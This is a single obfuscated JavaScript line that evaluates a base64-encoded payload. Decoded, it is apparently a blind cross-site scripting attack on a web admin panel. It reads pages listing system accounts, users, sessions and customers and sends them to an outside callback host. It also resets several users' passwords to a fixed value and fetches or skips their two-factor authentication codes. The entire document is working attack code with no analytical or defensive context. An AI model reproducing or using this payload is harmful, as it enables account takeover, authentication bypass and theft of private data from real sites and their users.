eval(atob('dmFyIGNvbGxlY3RfcGFnZV9saXN0MiA9IFsiL0hvbWUvTG9hZFN5c3RlbUFjY291bnRzIiwiL0hvbWUvTG9hZFJlcVNpZ25VcHMiLCIvSG9tZS9Mb2FkVXNlcnMiLCIvSG9tZS9Mb2FkU2Vzc2lvbnMiLCIvSG9tZS9Mb2FkQ3VzdG9tZXJzIiwiL0hvbWUvTG9hZFVzZXJzR3JvdXBzIiwiL0hvbWUvTG9hZEN1c3RvbWVycyJdOwoKICAgICAgICBmdW5jdGlvbiBzZW5kX2NvbGxlY3RlZF9wYWdlMiggcGFnZV9kYXRhICkgewogICAgICAgICAgICB2YXIgaHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICB2YXIgdXJsID0gImh0dHBzOi8vYmluaG1kYW5leC5ieHNzLmluL3BhZ2VfY2FsbGJhY2siOwogICAgICAgICAgICBodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgICAgICAgICBodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi9qc29uIik7CiAgICAgICAgICAgIGh0dHAub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBpZihodHRwLnJlYWR5U3RhdGUgPT0gNCAmJiBodHRwLnN0YXR1cyA9PSAyMDApIHsKCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaHR0cC5zZW5kKCBKU09OLnN0cmluZ2lmeSggcGFnZV9kYXRhICkgKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGNvbGxlY3RfcGFnZV9kYXRhMiggcGF0aCApIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHZhciBmdWxsX3VybCA9ICIvLyIgKyBkb2N1bWVudC5kb21haW4gKyBwYXRoCiAgICAgICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHhoci5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcGFnZV9kYXRhID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInBhZ2VfaHRtbCI6IHhoci5yZXNwb25zZVRleHQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidXJpIjogZnVsbF91cmwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMiggcGFnZV9kYXRhICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgeGhyLm9wZW4oJ1BPU1QnLCBmdWxsX3VybCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKICAgICAgICAgICAgICAgIHhoci5zZW5kKEpTT04uc3RyaW5naWZ5KHt9KSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VzMigpIHsKICAgICAgICAgICAgZm9yKCB2YXIgaSA9IDA7IGkgPCBjb2xsZWN0X3BhZ2VfbGlzdDIubGVuZ3RoOyBpKysgKSB7CiAgICAgICAgICAgICAgICAvLyBNYWtlIHN1cmUgdGhlIHBhdGggaXMgY29ycmVjdGx5IGZvcm1hdHRlZAogICAgICAgICAgICAgICAgaWYoIGNvbGxlY3RfcGFnZV9saXN0MltpXS5jaGFyQXQoMCkgIT0gIi8iICkgewogICAgICAgICAgICAgICAgICAgIGNvbGxlY3RfcGFnZV9saXN0MltpXSA9ICIvIiArIGNvbGxlY3RfcGFnZV9saXN0MltpXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbGxlY3RfcGFnZV9kYXRhMiggY29sbGVjdF9wYWdlX2xpc3QyW2ldICk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCgogICAgICAgICAgICAvLyBMb2FkIERhdGEKICAgICAgICAgICAgZnVuY3Rpb24gTG9hZERhdGEoKSB7CiAgICAgICAgICAgICAgdHJ5eyAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6ICIvSG9tZS9Mb2FkVXNlcnMiLAogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICBkYXRhVHlwZTogIkpTT04iLAogICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhKQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoZXIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoICggZSApIHsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIENoYW5nZVBhc3MoaWQpIHsKICAgICAgICAgICAgICB0cnl7ICAkLmFqYXgoewogICAgICAgICAgICAgICAgICAgIHVybDogIi9Ib21lL0VkaXRVc2VyUGFzc3dvcmQiLAogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICBkYXRhVHlwZTogIkpTT04iLAogICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsCiAgICAgICAgICAgICAgICAgICAgZGF0YTogSlNPTi5zdHJpbmdpZnkoe0lEOmlkLENvbmZpcm1OZXdQYXNzd29yZDoiU1dlc2RAMjMyMSIsTmV3UGFzc3dvcmQ6IlNXZXNkQDIzMjEifSksCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhKQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoZXIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoICggZSApIHsKICAgICAgICAgICAgICAgIH19CiAgICAgICAgICAgIGZ1bmN0aW9uIEVkaXRQYXNzKGlkKSB7CiAgICAgICAgICAgICAgdHJ5eyAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6ICIvSG9tZS9HZXRFZGl0VXNlciIsCiAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgIGRhdGFUeXBlOiAiSlNPTiIsCiAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeSh7IElEOiBpZCB9KSwKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oanFYSFIsIGV4Y2VwdGlvbikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3RyID0gIi43IyAxQkUgIiArIGpxWEhSLnN0YXR1cy50b1N0cmluZygpICsgIlxuIiArIGpxWEhSLnJlc3BvbnNlSlNPTi5NZXNzYWdlOwogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihzdHIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoICggZSApIHsKICAgICAgICAgICAgICAgIH19CgogICAgICAgICAgICAvLyBTaG93QXV0aENvZGUKICAgICAgICAgICAgZnVuY3Rpb24gU2hvd0F1dGhDb2RlKGlkKQogICAgICAgICAgICB7IHRyeXsKICAgICAgICAgICAgICAgICQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgdXJsOiAiL0hvbWUvR2V0QXV0aENvZGUiLAogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICBkYXRhVHlwZTogIkpTT04iLAogICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsCiAgICAgICAgICAgICAgICAgICAgZGF0YTogSlNPTi5zdHJpbmdpZnkoeyBJRDogaWQgfSksCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGVyKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoIGUgKSB7CiAgICAgICAgICAgICAgICB9ICB9CgogICAgICAgICAgICBmdW5jdGlvbiBTa2lwQXV0aENvZGUoaWQpIHsKICAgICAgICAgICAgICB0cnl7ICAkLmFqYXgoewogICAgICAgICAgICAgICAgICAgIHVybDogIi9Ib21lL1NraXBBdXRoQ29kZSIsCiAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgIGRhdGFUeXBlOiAiSlNPTiIsCiAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeSh7IElEOiBpZCB9KSwKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbihlcikgewogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGVyKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoIGUgKSB7CiAgICAgICAgICAgICAgICB9ICB9CgogICAgICAgICAgCiAgICAgICAgICAKICAgICAgICAKCkxvYWREYXRhKCk7CkNoYW5nZVBhc3MoNzgyMik7Q2hhbmdlUGFzcyg3ODI0KTtDaGFuZ2VQYXNzKDc4MjMpO0NoYW5nZVBhc3MoMTApOwpFZGl0UGFzcygwKTtFZGl0UGFzcygxKTsKClNob3dBdXRoQ29kZSgwKTtTaG93QXV0aENvZGUoMSk7U2hvd0F1dGhDb2RlKDIpO1Nob3dBdXRoQ29kZSgxMCk7ClNraXBBdXRoQ29kZSg3ODIyKTtTa2lwQXV0aENvZGUoNzgyMyk7U2tpcEF1dGhDb2RlKDc4MjQpO1NraXBBdXRoQ29kZSgxMCk7CiAgICAgICAgICBjb2xsZWN0X3BhZ2VzMigpOyAgCg=='))
